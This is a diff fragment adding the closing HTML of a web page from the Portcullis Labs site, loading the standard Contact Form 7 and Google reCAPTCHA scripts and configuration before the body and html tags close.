+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?ver=3.23'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"https:\/\/labs.portcullis.co.uk\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","sending":"Sending ..."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=3.3.2'></script>
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?onload=contact_form_7_recaptcha_callback&#038;render=explicit&#038;ver=1.0.0'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var contact_form_7_recaptcha_data = {"sitekey":"6LdFERITAAAAAJKGS2TEXuWsyOxc-KxvAZBC8zE2"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7-recaptcha/script.js?ver=1.0.0'></script>
+	<!-- 63 queries. 0.087 seconds. -->
+</div>
+</body>
+</html>
+
